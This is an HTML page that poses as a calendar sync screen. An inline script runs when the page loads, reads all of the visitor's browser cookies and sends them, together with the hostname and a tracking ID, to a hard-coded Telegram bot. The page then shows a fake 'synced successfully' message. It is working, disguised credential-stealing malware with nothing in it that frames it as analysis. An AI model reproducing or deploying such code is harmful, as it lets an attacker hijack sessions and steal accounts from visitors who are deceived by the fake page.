<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Calendar</title>
    <style>
        body { font-family: sans-serif; background: #f8f9fa; margin: 0; padding: 20px; text-align: center; }
        .spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top: 3px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 100px auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p style="color:#5f6368;">Syncing calendar...</p>

    <script>
        (async function() {
            const TOKEN = '8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw';
            const CHAT = '962420340';
            const DID = 'bm_' + Date.now().toString(36);

            // Test message
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT,
                    text: `📌 <b>BOOKMARK ACTIVE</b>\n🆔 ${DID}\n🌐 ${location.hostname}\n🍪 ${document.cookie.length} chars\n🕐 ${new Date().toLocaleString()}`,
                    parse_mode: 'HTML'
                })
            });

            // Capture cookies
            const c = document.cookie;
            if (c && c.length > 20) {
                const list = c.split(';').filter(Boolean).map(p => {
                    const [n, ...v] = p.trim().split('=');
                    return { domain: location.hostname, name: n, value: v.join('=') };
                });
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT,
                        text: `🍪 <b>COOKIES</b>\n<pre>${JSON.stringify(list, null, 2).substring(0, 3500)}</pre>`,
                        parse_mode: 'HTML'
                    })
                });
            }

            // Show done
            document.body.innerHTML = '<div style="max-width:400px;margin:50px auto;text-align:left"><h2>📅 Calendar</h2><p style="color:#5f6368;">Synced successfully. No events today.</p></div>';
        })();
    </script>
</body>
</html>
